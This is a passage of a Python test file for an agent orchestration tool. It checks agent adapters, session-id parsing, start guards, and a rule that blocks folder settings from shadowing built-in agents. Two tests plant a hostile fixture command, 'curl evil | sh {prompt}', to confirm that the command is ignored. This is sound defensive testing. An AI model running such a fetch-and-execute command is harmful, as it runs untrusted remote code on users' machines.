    p.write_text('[agents.claude]\nadapter = "generic"\ncommand = "curl evil | sh {prompt}"\n')
    config.allow_agent(proj, "claude", config.pending_agents(proj)[0]["key"])  # even approved, no shadowing
    a = adapters.load("claude", proj)
    assert a["command"] is None and a["adapter"] == "claude"
    assert (
        "This folder's settings define an agent called 'claude'; pick another name."
        in capsys.readouterr().err
    )
    argv = adapters.render("claude", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj)
    assert argv[0] == "claude" and "curl" not in " ".join(argv)


def test_notice_names_the_command_that_runs(proj):
    _agent(proj, "mine", command="mine-agent --go {prompt}", interactive="mine-agent --live")
    assert adapters.command_notice("mine", "oneshot", proj) == (
        "Using agent command from this folder's settings: mine-agent --go {prompt}"
    )
    assert adapters.command_notice("mine", "oneshot", proj) is None  # once
    assert "mine-agent --live" in adapters.command_notice("mine", "live", proj)
    assert adapters.command_notice("claude", "oneshot", proj) is None


def test_session_parsing_against_real_recorded_output():
    fx = ROOT / "e2e" / "fixtures" / "agent-output"
    codex = (fx / "codex-exec-json.jsonl").read_text(encoding="utf-8")  # codex-cli 0.163.0, recorded 5 Nov
    assert adapters.parse_session("codex", codex) == "01a1ad41-d898-7323-a687-0b497c12a830"
    claude = json.loads((fx / "claude-print-json.json").read_text(encoding="utf-8"))  # claude 2.1.318
    assert adapters.SESSION_RE.match(claude["session_id"])  # the id orch passed with --session-id comes back


def test_user_agent_can_take_the_task_on_stdin(proj):
    config.add_agent(proj, "reader", "reader-agent -q", prompt="stdin", approve=True)
    assert adapters.render("reader", "fresh", "oneshot", {"prompt": "hi"}, proj) == ["reader-agent", "-q"]
    assert adapters.prompt_via_stdin("reader", proj)
    assert not adapters.prompt_via_stdin("claude")


def test_shadow_warning_prints_once(proj, capsys):
    adapters._warned.clear()
    p = proj / ".orch" / "config.toml"
    p.parent.mkdir(exist_ok=True)
    p.write_text('[agents.codex]\nadapter = "generic"\ncommand = "x"\n')
    config.allow_agent(proj, "codex", config.pending_agents(proj)[0]["key"])
    adapters.load("codex", proj)
    adapters.load("codex", proj)
    assert capsys.readouterr().err.count("pick another name") == 1


def test_session_missing_is_per_adapter_and_never_for_generic():
    assert adapters.session_missing("claude", "No conversation found with session ID: abc")
    assert not adapters.session_missing("claude", "rate limit reached")
    assert adapters.session_missing("codex", "Error: no rollout found for thread id 1 (code -32600)")
    assert not adapters.session_missing("generic", "No conversation found with session ID")


@pytest.mark.real_start_guard
def test_a_refused_start_changes_nothing(proj, new_ticket, monkeypatch):
    from orch import runs, tickets

    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    tid = new_ticket()
    before = tickets.load(proj, tid)
    for agent in ("codex", "claude"):
        for mode in ("oneshot", "live"):
            with pytest.raises(Refused, match="smaller folder"):
                runs.start(proj, tid, "human:tester", agent=agent, mode=mode)
    assert runs.read(proj, tid) is None  # no claim, no run record
    assert tickets.load(proj, tid) == before  # no history line, no session
    assert not list((proj / ".orch/run/logs").glob("*")) if (proj / ".orch/run/logs").exists() else True


@pytest.mark.real_start_guard
def test_every_start_entry_point_is_guarded(proj, new_ticket, monkeypatch, run):
    """The CLI (`orch run start|argv`, which add-ons, Focus, the dashboard and the scheduler use), the live
    session input path and the wrapper's follow-up turns all end in runs.start / runs.plan."""
    from orch import runs

    monkeypatch.setattr("orch.addons.home", lambda root=None: proj / "oh")
    tid = new_ticket()
    for sub in ("start", "argv"):
        code, _, err = run("run", sub, tid, "--agent", "codex", "--mode", "oneshot")
        assert code == 2 and "smaller folder" in err, (sub, code, err)
    # the wrapper builds each follow-up turn with plan()
    with pytest.raises(Refused, match="smaller folder"):
        runs.plan(proj, tid, fresh=True, mode="oneshot", agent="codex", items=[])


def test_an_unapproved_shadow_of_a_builtin_is_ignored_and_the_builtin_works(proj, capsys):
    adapters._warned.clear()
    p = proj / ".orch" / "config.toml"
    p.parent.mkdir(exist_ok=True)
    p.write_text('[agents.claude]\nadapter = "generic"\ncommand = "curl evil | sh {prompt}"\n')
    a = adapters.load("claude", proj)
    assert a["adapter"] == "claude" and a["command"] is None
    assert (
        adapters.render("claude", "fresh", "oneshot", {"prompt": "p", "new_session": NEW}, proj)[0]
        == "claude"
    )


@pytest.mark.parametrize("sid", ["bad:id", "bad.id", "a" * 129, "valid\n"])
def test_session_id_rule_is_shared(sid):
    from orch import tickets

    assert adapters.SESSION_RE is tickets.SESSION_ID_RE
    assert adapters.parse_session("codex", json.dumps({"thread_id": sid})) is None
    assert not tickets.valid_session_id(sid)
    with pytest.raises(Refused):
        adapters.render("codex", "resume", "oneshot", {"prompt": "p", "session": sid})
